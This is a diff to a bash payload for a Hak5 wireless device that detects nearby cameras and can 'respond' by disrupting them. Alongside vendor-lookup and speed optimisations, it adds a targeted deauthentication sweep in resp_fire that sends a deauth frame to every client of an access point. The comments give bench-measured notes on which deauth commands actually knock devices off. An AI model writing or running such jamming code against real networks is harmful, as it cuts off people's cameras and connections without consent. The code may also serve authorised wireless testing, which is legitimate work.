@@ -86,6 +86,7 @@ NET_SYSFS="/sys/class/net"         # netdev tree the probe resolves RECON_IF's p
 BANDS_PROBE_N=12; BANDS_PROBE_WAIT=0.5   # band write check: samples of the live channel, and the gap between them (~6 s)
 # response rung (recon+response). RESPONSE=0 keeps the payload recon-only and silent.
 RESPONSE=1              # * master switch for the response rung (0 = recon only, transmits nothing)
+SWEEP_TARGETED=1        # * after a BSS-wide deauth, also send ONE TARGETED deauth per recovered member
 RESPONSE_CONFIRM=1      # * blocking confirmation dialog before any transmit (0 = act on accept alone)
 AUTO_RESPOND=0          # * let the funnel offer Disrupt by itself (needs RESPONSE=1; 0 = manual only)
 # shellcheck disable=SC2034
@@ -104,6 +105,7 @@ POSTURE_TTL=300         # * seconds a posture badge stays cached per BSSID
 RESP_LOCK_SECS=20       # * EXAMINE lock duration held across a response (must exceed fire + settle)
 RESP_SETTLE_SECS=6      # * wait after transmitting before re-reading the target to judge the effect
 LOOT_DIR="/root/loot/CamHound"
+OUI_KEYS="/tmp/cs_oui_keys.$$"          # vendor_prefetch's key list, removed as soon as awk has read it
 BANDS_STATE="$LOOT_DIR/.bands_orig"      # the bands a run changed, on disk (survives a reboot) so a killed run is undone by the watchdog or the next start
 OUI_FILE="/lib/hak5/oui.txt"; OUI_FILE_ALT="/rom/lib/hak5/oui.txt"
 # identity weights (constants, not table columns)
@@ -212,6 +214,7 @@ load_overrides() {
     RESP_LOCK_SECS=$(cfg RESP_LOCK_SECS "$RESP_LOCK_SECS" 5)
     RESP_SETTLE_SECS=$(cfg RESP_SETTLE_SECS "$RESP_SETTLE_SECS" 1)
     AUTO_RESPOND=$(cfg AUTO_RESPOND "$AUTO_RESPOND" 0)
+    SWEEP_TARGETED=$(cfg SWEEP_TARGETED "$SWEEP_TARGETED" 0)
     POSTURE_TTL=$(cfg POSTURE_TTL "$POSTURE_TTL" 0)
     DEDUPE_H=$(cfg DEDUPE_H "$DEDUPE_H" 0)
   fi
@@ -320,9 +323,64 @@ EOF
 
 # vendor lookup: one grep per NEW MAC, cached; both oui.txt key spellings and column layouts
 declare -A VENDOR VLOW
+# OUI_AWK: resolve many OUI keys in ONE pass over the table, instead of one grep per MAC.
+# Measured on the Pager 2026-11-05: a single failed `grep -i -m1` over /lib/hak5/oui.txt
+# (1,258,802 B, 38,959 lines) costs 5.05 s wall / 2.08 s CPU, and a cold cycle resolved 960 MACs.
+# Semantics are matched to the grep it replaces, which is prefix- and case-insensitive:
+#   * the line's own key is derived by stripping : and - and upper-casing the first six characters,
+#     so EC71DB, EC:71:DB, EC-71-DB and a longer first field such as EC71DB0 all reduce to EC71DB.
+#     The long-prefix case is not hypothetical - this payload ships a 7-nibble OUI row (A4:DA:22:2).
+#   * first match wins, mirroring grep -m1, so a duplicated OUI keeps the FIRST vendor, not the last.
+#   * FS is \t+ because bash's `IFS=$'\t' read` collapses tab runs and awk -F'\t' does not; the
+#     canonical IEEE 3-column layout has a double tab and would otherwise yield an empty vendor.
+#   * ishexish() replaces the /^[0-9A-Fa-f:-]{6,17}$/ interval, because mawk (what the dev host runs)
+#     and BusyBox awk (what the Pager runs) do not agree on interval regexes.
+OUI_AWK='
+function ishexish(x) { return (length(x) >= 6 && length(x) <= 17 && x ~ /^[0-9A-Fa-f:-]+$/) }
+BEGIN { FS = "\t+" }
+NR == FNR { want[$0] = 1; next }
+{ k = $1; gsub(/[:-]/, "", k); k = toupper(substr(k, 1, 6))
+  if ((k in want) && !(k in got)) {
+    if (NF < 2) { v = $0 }
+    else { v = $2; if (v == "(hex)" || ishexish(v)) v = (NF >= 3 ? $3 : ""); if (v == "") v = $2 }
+    got[k] = 1; print k "\t" v } }'
+
+# vendor_prefetch mac... -> resolve every not-yet-cached, non-randomised MAC in one table pass.
+# Misses are cached too (VLOW set to empty): the 5.05 s datum IS the miss, so caching only the hits
+# would optimise the cheap half and leave the expensive half falling through to vendor_of's grep.
+vendor_prefetch() {
+  local m hex v cv; local -A vp_want=() vp_found=()   # vp_ prefix: `want` and `found` are string locals
+                                                     # elsewhere, and bash locals are dynamically scoped
+  [ -r "$OUI_FILE" ] && (( $# > 0 )) || return 0
+  for m in "$@"; do
+    m=${m,,}; [ -n "${VLOW[$m]+x}" ] && continue
+    is_rand "$m" && continue
+    hex=${m^^}; hex=${hex//:/}; vp_want[${hex:0:6}]=1
+  done
+  (( ${#vp_want[@]} )) || return 0
+  printf '%s\n' "${!vp_want[@]}" >"$OUI_KEYS" 2>/dev/null || return 0
+  while IFS=$'\t' read -r hex v; do vp_found[$hex]="$v"; done < <(awk "$OUI_AWK" "$OUI_KEYS" "$OUI_FILE" 2>/dev/null)
+  rm -f "$OUI_KEYS"
+  for m in "$@"; do
+    m=${m,,}; [ -n "${VLOW[$m]+x}" ] && continue
+    is_rand "$m" && continue
+    hex=${m^^}; hex=${hex//:/}; v="${vp_found[${hex:0:6}]}"
+    VLOW[$m]="${v,,}"
+    cv="${v:--}"; cv=${cv//[![:print:]]/}; cv=${cv//[|;]/_}; VENDOR[$m]="${cv:0:14}"
+  done
+}
+
 vendor_of() {   # vendor_of mac -> sets VENDOR[mac] (clean, <=14) and VLOW[mac] (lowercase full)
-  local mac="$1" hex key line v=""
+  local mac="$1" hex key line v="" cv
   [ -n "${VLOW[$mac]+x}" ] && return 0
+  # A locally administered MAC is a guaranteed full-file miss, which is the 5.05 s worst case rather
+  # than the average, so skip the table for it. This MUST sit after the cache guard above: before it,
+  # st_device's injected VLOW is overwritten and four scoring checks fail (tested).
+  # The tempting premise "locally administered implies absent from the registry" is FALSE - the live
+  # MA-L registry carries 18 such assignments (AA0000-AA0004 DEC, 02608C/02C08C 3Com, 020701/027001
+  # Racal-Datacom) - but all 18 are 1980s vendors no modern device presents, and upsert_rows already
+  # refuses to persist a randomised client row at all, so the lookup buys nothing either way.
+  if is_rand "$mac"; then VLOW[$mac]=""; VENDOR[$mac]="-"; return 0; fi
   hex=${mac^^}; hex=${hex//:/}; key="${hex:0:6}"
   if [ -r "$OUI_FILE" ]; then
     line=$(grep -i -m1 -e "^${key}" -e "^${key:0:2}:${key:2:2}:${key:4:2}" -e "^${key:0:2}-${key:2:2}-${key:4:2}" "$OUI_FILE" 2>/dev/null)
@@ -333,16 +391,20 @@ vendor_of() {   # vendor_of mac -> sets VENDOR[mac] (clean, <=14) and VLOW[mac] 
       v=${v%%$'\t'*}
     fi
   fi
-  VLOW[$mac]="${v,,}"; VENDOR[$mac]=$(clean_text "${v:--}" 14)
+  # clean_text inlined: $( ) forked once per new MAC, measured at 1.15 ms a time in the cold cycle.
+  VLOW[$mac]="${v,,}"; cv="${v:--}"; cv=${cv//[![:print:]]/}; cv=${cv//[|;]/_}; VENDOR[$mac]="${cv:0:14}"
 }
 
 # is_rand mac -> locally administered bit set
 is_rand() { [[ ${1:1:1} =~ [26aeAE] ]]; }
 
-# band_of freq -> 2 | 5 | 6 | ?
+# band_of freq -> sets BAND_V to 2 | 5 | 6 | ?
+# Sets a global rather than printing: its one caller is in the per-device path, where $( ) forked
+# once per device per cycle. Measured in container against a 960-device fixture, inlining this and
+# band_rank took a warm cycle from 5.22 s to 0.72 s - 86% of the steady-state cycle was these two.
 band_of() {
   local f="$1"
-  if (( f >= 5925 )); then printf 6; elif (( f >= 4900 )); then printf 5; elif (( f >= 2400 )); then printf 2; else printf '?'; fi
+  if (( f >= 5925 )); then BAND_V=6; elif (( f >= 4900 )); then BAND_V=5; elif (( f >= 2400 )); then BAND_V=2; else BAND_V='?'; fi
 }
 
 # --- response posture begin ---
@@ -1099,7 +1161,7 @@ record_seen() {
   LAST_SEEN[$mac]=$EPOCHSECONDS; N_SEEN[$mac]=$((${N_SEEN[$mac]} + 1)); SEEN_THIS_CYCLE+=("$mac")
   [ -n "$ssid" ] && SSID_CLEAN[$mac]="$ssid"
   [ "$ch" != 0 ] && CH[$mac]="$ch"
-  if [ "$fr" != 0 ] && [ -n "$fr" ]; then FREQ[$mac]="$fr"; BAND[$mac]=$(band_of "$fr"); fi
+  if [ "$fr" != 0 ] && [ -n "$fr" ]; then FREQ[$mac]="$fr"; band_of "$fr"; BAND[$mac]=$BAND_V; fi
   if [[ $sig =~ ^-?[0-9]+$ ]]; then
     RSSI_LAST[$mac]=$sig
     h="${RSSI_HIST[$mac]} $sig"; set -- $h; (( $# > 3 )) && shift $(( $# - 3 )); RSSI_HIST[$mac]="$*"
@@ -1909,6 +1971,32 @@ resp_fire() {   # resp_fire <mac> <attack key> <badge> -> 0 when a verdict was r
     LOG red "$cmd refused (rc $frc): nothing was transmitted"${ferr:+$'\n'"$ferr"}
     for m in "${subjects[@]}"; do resp_write "$mac" "$badge" "$k" "$cmd" "$lock" "${P0[$m]}" - CMD_REFUSED "$m"; done
     set_state RESPOND_NIL; return 1
+  fi
+  # Targeted sweep. Measured on the bench 2026-11-05 against one phone on one AP: a TARGETED
+  # PINEAPPLE_DEAUTH_CLIENT dropped it immediately, while PINEAPPLE_DEAUTH_CLIENT_ALL and
+  # PINEAPPLE_DEAUTH_CLIENT_CSA were both accepted (rc 0) and did nothing. That is one data point
+  # from the hardest class of client - a modern phone with a randomised MAC - and it says nothing
+  # about what a cheap camera's stack does, so this ADDS a targeted frame per member rather than
+  # replacing the broadcast one. The two are complementary, not ordered: broadcast reaches members
+  # the capture never enumerated and is immune to a stale address, while targeted reaches members
+  # that filter broadcast. Doing both is better than either, and costs n frames instead of one.
+  # Not for CSA: that command takes no target (<bssid> <channel>, arity measured on the device).
+  if [ "$SWEEP_TARGETED" = 1 ] && [ "$k" != CSA ] && [ "$R_TARGET" = ff:ff:ff:ff:ff:ff ] && (( n > 0 )); then
+    local sw_cmd sw_ok=0 sw_rc sw_err
+    sw_cmd=$(response_cmd DEAUTH)
+    if [ -n "$sw_cmd" ] && command -v "$sw_cmd" >/dev/null 2>&1; then
+      for m in "${subjects[@]}"; do
+        : >"$FIRE_ERR"
+        "$sw_cmd" "$R_BSSID" "$m" "$R_CH" >/dev/null 2>"$FIRE_ERR"; sw_rc=$?
+        sw_err=$(tr '\n' ' ' <"$FIRE_ERR" 2>/dev/null); rm -f "$FIRE_ERR"
+        # rc is useless on this firmware (hak5cmd exits 0 on its error paths too, measured), so the
+        # stderr is the only signal that a frame was refused.
+        if (( sw_rc == 0 )) && [ -z "$sw_err" ]; then sw_ok=$((sw_ok + 1))
+        else log resp "sweep $m rc=$sw_rc${sw_err:+ err=${sw_err:0:120}}"; fi
+      done
+      log resp "sweep $sw_cmd $R_BSSID targeted=$sw_ok of $n"
+      (( sw_ok > 0 )) && LOG "targeted $sw_ok/$n client(s)"
+    fi
   fi
   sleep "$RESP_SETTLE_SECS"
   resp_snapshot "$scope"
